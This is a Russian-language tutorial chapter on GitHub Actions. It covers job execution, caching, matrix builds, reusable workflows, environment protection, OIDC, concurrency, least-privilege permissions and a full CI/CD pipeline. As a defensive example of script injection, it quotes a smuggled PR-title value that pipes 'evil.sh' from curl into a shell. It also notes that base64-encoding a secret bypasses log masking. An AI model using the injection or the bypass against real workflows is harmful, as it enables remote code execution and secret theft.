---
title: "GitHub Actions глубоко"
description: "Workflow-синтаксис, jobs и steps, кэширование npm и Docker-слоёв через buildx, matrix-стратегии, reusable workflows и composite actions, environment protection rules, OIDC, path-filters, concurrency и полный пайплайн lint-test-build-scan-deploy."
---

GitHub Actions кажется простым: YAML в `.github/workflows/`, и через три минуты у тебя зелёная галочка. Простота эта обманчива — за ней скрываются модель исполнения (что где и как долго живёт), управление состоянием между job'ами, безопасность секретов и десятки способов ускорить прогон с 15 минут до 4. Эта глава — про механику, которая превращает «работает» в «быстро, безопасно и поддерживается».

## Модель исполнения: workflow, job, step

```text
workflow (событие: push / PR / schedule / workflow_dispatch)
 └─ job 1 ── runner ubuntu-24.04, свой чистый ВМ-контейнер
     ├─ step: uses: actions/checkout@v4     ← action = переиспользуемый блок
     ├─ step: run: npm ci                   ← step = команды в shell той же ВМ
     └─ step: id: meta / run: echo ...      ← вывод: $GITHUB_OUTPUT
 └─ job 2 ── needs: [job 1], outputs из шага 1
 └─ job 3 ── strategy: matrix, 4 комбинации
```

Ключевые факты, которые всё объясняют:

- Каждый **job** получает *свежую* виртуальную машину (Ubuntu, 2-4 vCPU, ~14 ГБ RAM). Всё, что job записал на диск, **не видно** другим job'ам — кроме артефактов и кэша.
- **Step'ы внутри job** исполняются последовательно в одном shell-процессе (рабочая директория сохраняется, env из `run:` не переживает step — используй `$GITHUB_ENV`).
- Параллельность — только между job'ами (`needs` строит DAG) или внутри matrix.

Передача данных между job'ами:

```yaml
jobs:
  build:
    runs-on: ubuntu-24.04
    outputs:
      image: ${{ steps.meta.outputs.image }}
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - id: meta
        run: echo "image=ghcr.io/${{ github.repository }}:${{ github.sha }}" >> "$GITHUB_OUTPUT"

  deploy:
    needs: build
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Деплоим ${{ needs.build.outputs.image }}"
      - env:
          DIGEST: ${{ needs.build.outputs.digest }}
        run: echo "$DIGEST" > digest.txt        # digest — иммутабельный идентификатор образа
```

Иммутабельный **digest** (sha256 образа) важнее тега: тег `latest` можно перезаписать, digest — нет. Деплой по digest гарантирует, что в проде ровно тот бит, что прошёл сканирование.

## Кэширование: npm и слои Docker

Главный буст прогона. Два независимых механизма:

**Кэш зависимостей npm** — ключ кэша от lockfile; попадание = `npm ci` за секунды:

```yaml
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm                    # ключ: hash package-lock.json
```

**Кэш слоёв Docker через buildx** — GitHub Actions cache backend (`type=gha`) хранит слои между прогонами:

```yaml
      - uses: docker/setup-buildx-action@v3

      - uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.image }}
          cache-from: type=gha          # читать слои из кэша прогона
          cache-to: type=gha,mode=max   # писать ВСЕ слои (max), не только финальные
          provenance: false
```

`mode=max` — критично: без него кэшируются только слои финального образа, а промежуточные (с установкой зависимостей) теряются, и каждый прогон ставит зависимости заново. После включения обоих типичный прогон падает с 8-10 до 2-4 минут.

:::tip[Кэш vs артефакт]
Кэш — оптимизация (может отсутствовать, ключи меняются, eviction). Артефакт — гарантированный результат job'а для следующих (`upload-artifact`/`download-artifact`). Сборку из кэша продлеваем, собранные бинарники передаём артефактом.
:::

## Matrix-стратегии

Один job-описание, N комбинаций исполнений:

```yaml
  test:
    strategy:
      fail-fast: false              # одна упавшая комбинация не роняет остальные
      matrix:
        node: [20, 22]
        os: [ubuntu-24.04]
        include:
          - node: 22
            os: ubuntu-22.04        # доп. комбинация сверх декартова произведения
        exclude:
          - node: 20
            os: ubuntu-22.04
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-node@v4
        with: { node-version: ${{ matrix.node }}, cache: npm }
      - run: npm ci && npm test
```

Приёмы: `fail-fast: false` — видеть ВСЕ падающие версии, а не первую; `include`/`exclude` — точечная настройка декартова произведения. Не раздувай матрицу сверх необходимого: каждая комбинация — полный прогон.

## Переиспользование: reusable workflows и composite actions

Два механизма, часто путаемые:

- **Reusable workflow** (`on: workflow_call`) — целый workflow как вызываемая функция: свои job'ы, runner'ы, секреты. Для «сборка образа» в 10 репозиториях.
- **Composite action** (`runs: using: composite`) — группа шагов внутри одного job'а. Для «установи зависимости проекта» внутри разных workflow.

```yaml
# .github/workflows/reusable-build.yml — в репозитории с общими пайплайнами
name: build
on:
  workflow_call:
    inputs:
      image: { required: true, type: string }
    secrets:
      registry-token: { required: true }
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.registry-token }}
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ${{ inputs.image }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

```yaml
# вызов из прикладного репозитория
jobs:
  build:
    uses: darkpix/workflows/.github/workflows/reusable-build.yml@main
    with:
      image: ghcr.io/darkpix/pet-api:${{ github.sha }}
    secrets:
      registry-token: ${{ secrets.GITHUB_TOKEN }}
```

Пингуй версию (`@main` → `@v1.2.0` или SHA) — reusable workflow имеет тот же риск supply-chain, что и action: внешний код исполняется с твоими секретами.

## Окружения, секреты и защита продакшена

**Environments** связывают секреты, правила и URL деплоя с именованным окружением:

```yaml
  deploy:
    needs: scan
    environment:
      name: prod
      url: https://api.darkpix.dev
    runs-on: ubuntu-24.04
    steps:
      - uses: azure/k8s-set-context@v4
        with: { kubeconfig: ${{ secrets.PROD_KUBECONFIG }} }
      - run: kubectl -n pet set image deploy/api api=${{ needs.build.outputs.image }}
```

В настройках репозитория (Settings → Environments → prod): **required reviewers** — деплой ждёт ручного approve; **deployment branch policy** — только из `main`; **environment secrets** — `PROD_KUBECONFIG` не виден job'ам без `environment: prod`. Дополнительно: protection rules на ветку `main` (обязательный PR + зелёный CI) — прямой push в прод невозможен в принципе.

**OIDC в облако — вместо долгоживущих ключей.** Классика: AWS access key в секретах живёт месяцами и утекает в логи. OIDC: GitHub выпускает краткоживущий JWT на время прогона, AWS (IAM role с trust policy на конкретный репозиторий и ветку) принимает его и выдаёт временные credentials:

```yaml
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
          aws-region: eu-central-1
```

Роль в AWS ограничена: только конкретный репозиторий, только ветка `main`, только нужные действия (ECR push). Утечка секрета невозможна по определению — секрета нет. Тот же механизм работает для GCP Workload Identity и Azure.

## Монорепозиторий: path-filters и concurrency

В монорепе прогонять всё при правке одного пакета — расточительство:

```yaml
on:
  push:
    branches: [main]
    paths:
      - "apps/api/**"
      - "packages/shared/**"
      - "package-lock.json"
      - ".github/workflows/api.yml"
```

Фильтры на уровне триггера: workflow не стартует вообще. Для job'ов внутри workflow — step `dorny/paths-filter` с условиями `if:`.

**Concurrency** — отмена устаревших прогонов: быстрые пуши в одну ветку не должны очередеваться за мёртвые прогоны:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true   # новый push в ветку убивает прогон старого коммита
```

Для деплоя в prod — `cancel-in-progress: false` (посередине деплоя не отменяем), но group на окружение: вторая выкатка ждёт первую.

## Защита workflow: permissions и GITHUB_TOKEN

Каждому workflow выдавай **минимальный набор permissions** — дефолтный `write-all` у токена прогона означает, что любой action (включая скомпрометированный) может перезаписать репозиторий и упаковки:

```yaml
permissions: {}                        # глобально: ничего нельзя
jobs:
  lint-test:
    permissions: { contents: read }    # job'у — ровно его потребность
  build:
    permissions:
      contents: read
      packages: write                  # push в ghcr — только здесь
```

`GITHUB_TOKEN` живёт до конца прогона и автоотзывается — это уже лучше персональных токенов. Для доступа в *другой* репозиторий (инфра-репозиторий GitOps) PAT ограничивай: classic PAT с `repo`-скоупом — антипаттерн; ставь **fine-grained token** с доступом только к одному репозиторию и только к `Contents: write`. Ещё лучше — GitHub App с установкой в два репозитория: у неё короткоживущие токены и явный список прав.

Третий слой: **script injection** через `run:`. Интерполяция `${{ }}` внутри shell-команды — классическая дыра: название PR `"; curl evil.sh | sh; #` выполнится. Правило: всё, что пришло извне (title, branch, commit message), — в env, а в `run` — через `"$ENV"`:

```yaml
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Проверяем PR: $TITLE"   # безопасно: значение — данные, не код
```

## Полный пайплайн: lint-test-build-scan-deploy

Собираем всё вместе — этот файл можно взять в проект почти без правок:

```yaml
# .github/workflows/pipeline.yml
name: pipeline
on:
  push:
    branches: [main]
    paths: ["src/**", "package*.json", "Dockerfile", ".github/workflows/pipeline.yml"]
  pull_request:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

env:
  REGISTRY: ghcr.io
  IMAGE: ghcr.io/${{ github.repository }}

jobs:
  lint-test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test -- --coverage

  build:
    needs: lint-test
    if: github.event_name == 'push'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write           # push в ghcr
    outputs:
      image: ${{ env.IMAGE }}:${{ github.sha }}
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: true
          tags: ${{ env.IMAGE }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  scan:
    needs: build
    runs-on: ubuntu-24.04
    steps:
      - name: Trivy: уязвимости образа
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ needs.build.outputs.image }}
          severity: CRITICAL,HIGH
          ignore-unfixed: true
          exit-code: "1"                    # критичные CVE = красный пайплайн

      - name: Trivy: проверка Dockerfile и конфигов (IaC)
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: config
          scan-ref: .
          severity: HIGH
          exit-code: "1"

  deploy-staging:
    needs: [build, scan]
    environment: staging
    runs-on: ubuntu-24.04
    steps:
      - uses: azure/k8s-set-context@v4
        with: { kubeconfig: ${{ secrets.STAGING_KUBECONFIG }} }
      - run: kubectl -n pet-staging set image deploy/api api=${{ needs.build.outputs.image }}

  deploy-prod:
    needs: [build, scan, deploy-staging]
    if: github.ref == 'refs/heads/main'
    environment: prod                        # required reviewers + prod-секреты
    runs-on: ubuntu-24.04
    steps:
      - uses: azure/k8s-set-context@v4
        with: { kubeconfig: ${{ secrets.PROD_KUBECONFIG }} }
      - run: kubectl -n pet set image deploy/api api=${{ needs.build.outputs.image }}
```

Сквозная логика: дешёвые проверки (lint-test) первыми и на каждом PR; сборка и сканирование — только на push (в PR не пушим образы); staging — автоматически после скана; prod — после staging, с ручным approve через environment. Дальнейший шаг — заменить `kubectl set image` на бамп тега в GitOps-репозитории (следующая глава) — и CI вообще теряет прямой доступ к кластерам.

## Типичные ошибки и грабли

1. **Кэш включён, а `npm ci` всё равно 3 минуты.** Ключ кэша не совпадает: ветки видят кэш только из base-ветки и своей, либо lockfile генерируется заново. Смотри лог setup-node: «Cache restored from key…» или «Cache not found».
2. **`cache-to` без `mode=max`.** Кэшируется только финальный слой; слой с `npm ci` теряется. Сборка ускоряется незначительно.
3. **Секреты в логах через обход маскировки.** `echo ${{ secrets.X }} | base64` выводит значение, которое GitHub не успел замаскировать. Правило: секреты только в env action'ов, никогда в `run` с трансформациями; плюс action вроде `stepsecurity/harden-runner` для аудита.
4. **Matrix с `fail-fast: true` по умолчанию.** Упала Node 20 — отменились 22 и остальные, ты видишь одну ошибку вместо полной картины. Всегда `fail-fast: false` для тестов.
5. **Деплой из PR с доступом к секретам.** Workflow от форкнутого PR получает `pull_request` без секретов — спасает. Но `pull_request_target` исполняется в контексте base-репозитория С секретами: `checkout` кода из форка + `pull_request_target` = классическая утечка секретов. Не запускай непроверенный код в таком контексте.
6. **Reusable workflow по `@main`.** Правка общего пайплайна мгновенно ломает все репозитории. Пингуй на тег или SHA, обновляй осознанно.
7. **Нет concurrency.** Пять быстрых пушей — пять прогонов в очереди, деплой старой ревизии последним. `cancel-in-progress` на тесты, сериализация на деплой.

## Вопросы на собеседовании

1. **Чем отличаются artifacts, cache и outputs?** Outputs — переменные между job'ами (строки, до 1 МБ). Artifacts — файлы, гарантированно доступные следующим job'ам/после прогона. Cache — разделяемое между прогонами хранилище по ключу, без гарантий присутствия (оптимизация).
2. **Как работает кэш buildx `type=gha`?** Слои образа сохраняются как блобы в actions cache под ключом от Dockerfile и build-контекста; следующий прогон поднимает восстанавливаемые слои до первого изменённого, дальше — обычная сборка.
3. **OIDC-аутентификация в облако: что вместо access key?** GitHub выпускает JWT с claims (repo, ref, environment) на время прогона; облачная IAM-роль с trust policy проверяет claims и выдаёт временные credentials. Никаких долгоживущих секретов.
4. **Reusable workflow против composite action?** Reusable — целый набор job'ов со своими runner'ами (граница — job). Composite — последовательность шагов внутри существующего job'а. Первое — для пайплайнов, второе — для «входных» рутин.
5. **Как защитить prod-деплой?** Слои: protection rules на ветку (PR + зелёный CI), environment с required reviewers и branch policy, job `if: github.ref == 'refs/heads/main'`, секреты только в environment. Для GitOps (след. глава) — CI вообще без доступа к кластеру.
6. **`pull_request` против `pull_request_target`?** Первый — безопасный контекст форка, без секретов репозитория. Второй — контекст base-ветки, с секретами, но код тоже base: опасен при checkout чужого кода. Правило: `pull_request_target` только для действий с метаданными PR, не для сборки кода из форка.
7. **Concurrency: что поставить на тесты и на деплой?** Тесты: `cancel-in-progress: true` (свежий коммит важнее старого прогона). Деплой: `cancel-in-progress: false`, group на окружение (последовательность выкаток, не параллельность).

## Практика

1. Замерь прогон пайплайна «с нуля» (кэш пуст): время каждой стадии. Включи `cache: npm` и `type=gha,mode=max`, сделай пять прогонов, усредни. Сравни и объясни разницу по стадиям.
2. Настрой matrix на Node 20/22 + fail-fast: false. Добавь тест, падающий только на Node 20 (например, использующий фичу 22), убедись, что 22 проходит.
3. Вынеси сборку образа в reusable workflow в отдельном репозитории, вызови из двух проектов. Измени reusable на тег `v1`, сделай `v1.1` с прокидыванием build-args.
4. Настрой environment `prod` с required reviewer (пригласи второй аккаунт). Сделай падающий скан Trivy (образ со старым `lodash`), убедись, что до approve дело не доходит.
5. Настрой OIDC-роль (можно в minikube-кластер без AWS — через eks-pod-identity эмуляцию или документацией AWS на free tier): добейся деплоя без единого долгоживущего секрета в репозитории.

## Что почитать

- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions) — полный справочник
- [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows) и [Creating composite actions](https://docs.github.com/en/actions/creating-actions/creating-a-composite-action)
- [Using environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)
- [Configuring OpenID Connect in AWS](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)
- [docker/build-push-action](https://github.com/docker/build-push-action/blob/master/docs/advanced/cache.md) — кэширование в деталях
